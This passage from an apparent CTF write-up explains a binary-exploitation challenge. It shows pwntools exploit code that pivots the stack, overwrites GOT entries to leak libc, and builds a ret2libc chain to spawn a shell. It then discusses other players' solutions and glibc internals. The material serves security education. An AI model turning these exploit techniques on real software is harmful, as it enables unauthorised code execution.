style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">new_rsp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">	    </span><span class="token comment" style="color:#999988;font-style:italic"># saved rbp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fgets_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># return address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">overflow</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> prompt</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># rsp -&gt; [stack]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># rbp -&gt; new_rsp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># fgets(rbp-0x80) -&gt; fgets(new_rsp-0x80)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># overflow</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> rbp_rip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">got</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x100</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> fgets_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># pad upto addr_switch</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;B&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_switch </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">new_rsp</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">0x80</span><span class="token operator" style="color:#393A34">+</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># fgets(got) for a GOT overwrite</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> rbp_rip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">got</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> fgets_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">	        </span><span class="token comment" style="color:#999988;font-style:italic"># switch1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># fgets() for final ROP payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> rbp_rip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_rop</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> fgets_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">	        </span><span class="token comment" style="color:#999988;font-style:italic"># switch2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># rsp -&gt; new_rsp+0x10 (+0x10 due to &quot;pop rbp&quot; and &quot;ret&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># rbp -&gt; got+0x100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># fgets(rbp-0x80) -&gt; fgets(got+0x80)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># got+0x80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_rbp_rip  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> switch</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># overflow to do switch1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_rbp_rip  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fake_rbp_rip</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_rbp_rip </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> switch</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fake_rbp_rip</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># overwrite GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># change strlen@GOT -&gt; puts@PLT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># so that strlen(buf) leaks puts@GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">puts </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">puts</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># strlen@GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">printf </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fgets </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># after overwriting strlen@GOT -&gt; puts@PLT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># the GOT buffer is printed back to us due to strlen(rbp-0x80)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># at the start of the buffer is puts@GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># (which is resolved by the time of the call to puts)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># so &amp;puts is leaked</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc_leak </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">overwrite</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> leak</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc_leak </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> u64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc_leak </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;puts: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">hex</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">libc_leak</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc_leak </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">puts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;libc: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">hex</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">libc</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">address</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># switch(2) is done immediately afterwards</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># to then write data to addr_rop</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># time for a classic ret2libc</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># (addr_rop is sufficiently large enough for system&#x27;s stack)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rdi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x2a3e5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pop_rdi </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">next</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">search</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ret</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">system</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="other-solutions">Other solutions<a href="#other-solutions" class="hash-link" aria-label="Direct link to Other solutions" title="Direct link to Other solutions">​</a></h2>
<p>While the above solution works, there&#x27;s a lot of fiddling around with stack frames, <code>rbp</code> and <code>rsp</code> which makes it a bit clumsy at times.</p>
<p>Many other solutions were able to use the idea of overwriting the GOT in a more effective way. <code>strlen@GOT</code> was still a prime target for overwrites, as I had intended, however the way it was used was interesting.</p>
<p>What caused me problems was that I would overwrite <code>strlen@GOT</code> to point directly to a <code>puts</code> function, which returns normally, then I would reach the end of <code>main</code>, which forced me to use the return address to continue execution, which led to stack fiddling nonsense.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="neatest-solution">Neatest solution<a href="#neatest-solution" class="hash-link" aria-label="Direct link to Neatest solution" title="Direct link to Neatest solution">​</a></h3>
<p>However many solutions were able to keep <code>rsp</code> on the stack the whole time. My favourite one was by <a href="https://app.hackthebox.com/users/10693" target="_blank" rel="noopener noreferrer">laxa</a>, which overwrote <code>strlen@GOT</code> to the part in <code>main</code> which called <code>printf</code>, without setting arguments.</p>
<figure><img src="/assets/Screenshot 2024-05-22 165139 (1).png" alt=""><figcaption><p>printf gadget</p></figcaption></figure>
<p>This allowed them to call <code>printf</code> on the <code>GOT</code>, but was also able to immediately write to the <code>GOT</code> <strong>again</strong>, as the call to <code>fgets</code> was immediately afterwards. Then with the leak, they could overwrite <code>strlen@GOT</code> again to <code>system</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="fun-with-funlockfile">Fun with (fun)lockfile<a href="#fun-with-funlockfile" class="hash-link" aria-label="Direct link to Fun with (fun)lockfile" title="Direct link to Fun with (fun)lockfile">​</a></h3>
<p>The funniest one was one by <a href="https://app.hackthebox.com/users/271893" target="_blank" rel="noopener noreferrer">Nauxuron</a>, which used a quirk of <code>printf</code> that placed a pointer to <code>funlockfile</code> in <code>rdi</code> after returning, so that they could then call <code>puts</code> on that to get a libc leak.</p>
<figure><img src="/assets/image (115).png" alt=""><figcaption><p>After <code>printf(&quot;Data: &quot;)</code></p></figcaption></figure>
<p>Interestingly when I was designing this challenge, I was using <code>gets</code>, and discovered some nifty unintended solutions which also relied on a certain value being into <code>rdi</code> after a call (to <code>gets</code> in this case), which led to the <a href="/pwn/pwn/rop-2.34+/ret2gets">ret2gets</a> page. While I fixed that, I did not anticipate this happening with <code>printf</code>, because why on earth would this happen??</p>
<p>After looking at glibc source code (yes I was that curious), I found out why. Just like with ret2gets, it&#x27;s actually to do with unlocking happening at the end of the function, specifically <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L2286" target="_blank" rel="noopener noreferrer">here</a> (and <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L1609" target="_blank" rel="noopener noreferrer">here</a> when buffered).</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">_IO_funlockfile</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">_IO_cleanup_region_end</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> done</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>The important macros here are <code>__libc_cleanup_region_start</code> and <code>__libc_cleanup_region_end</code>, defined <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/libc-lock.h#L157" target="_blank" rel="noopener noreferrer">here</a>.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">/* Start critical region with cleanup.  */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">__libc_cleanup_region_start</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">DOIT</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> FCT</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> ARG</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">			</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">   bool _cleanup_start_doit</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">struct</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression class-name" style="color:#36acaa">_pthread_cleanup_buffer</span><span class="token macro property expression" style="color:#36acaa"> _buffer</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">				</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property comment" style="color:#999988;font-style:italic">/* Non-addressable copy of FCT, so that we avoid indirect calls on	\</span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property comment" style="color:#999988;font-style:italic">     the non-unwinding path.  */</span><span class="token macro property" style="color:#36acaa">					</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">void</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression operator" style="color:#393A34">*</span><span class="token macro property expression" style="color:#36acaa">_cleanup_routine</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression keyword" style="color:#00009f">void</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression operator" style="color:#393A34">*</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">FCT</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">				</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression" style="color:#36acaa">_buffer</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">__arg </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">ARG</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">DOIT</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">								</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression" style="color:#36acaa">_cleanup_start_doit </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> true</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">					</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression" style="color:#36acaa">_buffer</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">__routine </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> _cleanup_routine</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">				</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression function" style="color:#d73a49">__libc_cleanup_push_defer</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression operator" style="color:#393A34">&amp;</span><span class="token macro property expression" style="color:#36acaa">_buffer</span><span class="token macro property expression punctuation" 